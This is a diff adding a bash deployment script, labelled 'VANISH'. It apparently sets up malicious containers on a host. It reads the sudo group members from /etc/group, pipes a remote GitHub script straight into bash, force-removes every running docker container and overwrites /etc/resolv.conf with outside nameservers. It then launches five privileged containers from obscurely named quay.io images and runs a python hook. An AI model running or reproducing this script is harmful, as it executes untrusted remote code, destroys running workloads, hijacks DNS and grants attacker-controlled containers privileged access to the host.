@@ -1,0 +1,27 @@
+#VANISH
+#!/bin/bash
+# export su_img_2=$SUDO_USER
+# echo $su_img_2
+# youcefshalhoub
+echo  $(grep '^sudo:.*$' /etc/group | cut -d: -f4) > read.me
+
+export su_img_3=$(cat read.me)
+curl https://raw.githubusercontent.com/GH0STAV0/lsq_0_c/main/runn_van.sh | bash
+echo  $su_img_3
+export host=$su_img_3"-gc-emma-"
+export img="quay.io/cata0nana/vanish_bo_indabox_qu"
+export im5g="quay.io/xm0uray/ham_ham_img"
+export sess="p"
+echo $img
+docker rm -f $(docker ps -q)
+#docker rmi -f $img
+#docker rmi -f $img2
+echo -e "nameserver 103.86.96.100\nnameserver 103.86.99.100" >  /etc/resolv.conf
+
+echo  "HOST : [" $host " ] " " | IMAGE_DOCKER : [ "$img " ]" $sess
+for (( i=1; i <= 5; i++ )); do
+  bash -c  "docker run -d --shm-size=2g --name $sess$i --cap-add=NET_ADMIN  -h  $host$i --privileged -v /sys/fs/cgroup:/sys/fs/cgroup:ro  $img"
+done
+#python3 /root/
+export infos=$img"-gc-MAIN-Deploy_End "
+python3 /root/hassed/docker_hook.py $infos
